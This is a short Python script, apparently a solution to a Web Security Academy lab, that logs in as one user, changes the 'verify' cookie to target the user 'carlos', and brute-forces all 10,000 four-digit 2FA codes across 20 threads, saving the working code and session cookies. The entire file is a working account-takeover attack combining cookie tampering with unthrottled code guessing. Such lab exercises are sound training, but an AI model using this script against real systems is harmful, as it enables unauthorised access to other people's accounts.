import requests
import threading

DOMAIN = "0a9d009b039b89fc87fa44de001900e9.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/login2",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
}


def brute_2fa_code(username, start=0, end=10000):
    data = {}
    for i in range(start, end):
        data["mfa-code"] = str(i).zfill(4)
        response = requests.post(f"https://{DOMAIN}/login2", headers=HEADERS, data=data, allow_redirects=True)
        print(f"Trying 2FA code {str(i).zfill(4)}")
        print(response.status_code)

        if response.status_code == 302:
            print(response.text)
            print(f"2FA code for {username} is {data['mfa-code']}")
            print(response.headers)
            print(response.cookies)
            exit(0)

        if "Your username is" in response.text:
            print(response.text)
            print(response.headers)
            print(f"2FA code for {username} is {data['mfa-code']}")
            print(response.cookies)
            with open("2fa_code.txt", "w") as file:
                file.write(data['mfa-code'])
                file.write("\n")
                file.write(response.text)
            exit(0)

def pass_2fa(mfa_code):
    data = {}
    data["mfa-code"] = str(mfa_code)

    response = requests.post(f"https://{DOMAIN}/login2", headers=HEADERS, data=data, allow_redirects=True)
    print(response.cookies)
    print(response.headers)
    print("STATUS CODE: ", response.status_code)
    print(response.text)

def login(username="wiener", password="peter"):
    data = {
        "username": username,
        "password": password
    }

    response = requests.post(f"https://{DOMAIN}/login", headers=HEADERS, data=data, allow_redirects=True)

    HEADERS["Cookie"] = response.request.headers["Cookie"].replace("verify=wiener", "verify=carlos")
    print(HEADERS["Cookie"])


def multi_thread_bruteforce():
    threads = []
    username = "carlos"

    start = 0
    end = 500

    for i in range(20):
        threads.append(threading.Thread(target=brute_2fa_code, args=(username, start, end)))
        start = start + 500
        end = end + 500

    for thread in threads:
        thread.start()
    
    for thread in threads:
        thread.join()

login()
# pass_2fa(input("Enter 2FA code: "))
multi_thread_bruteforce()
